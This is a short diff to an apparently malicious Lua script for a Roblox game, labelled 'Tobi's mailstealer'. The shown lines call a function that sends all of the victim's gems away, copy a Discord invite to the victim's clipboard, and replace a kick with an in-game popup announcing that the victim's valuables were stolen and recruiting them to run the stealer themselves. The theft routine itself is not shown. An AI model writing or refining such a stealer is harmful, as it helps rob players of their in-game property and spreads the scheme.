@@ -303,4 +303,5 @@ for _, item in ipairs(sortedItems) do
 end
 SendAllGems()
 setclipboard("https://discord.gg/HcpNe56R2a")
-plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
+local message = require(game.ReplicatedStorage.Library.Client.Message)
+message.Error("All your valuable items just got stolen by Tobi's mailstealer!\nJoin discord.gg/HcpNe56R2a")
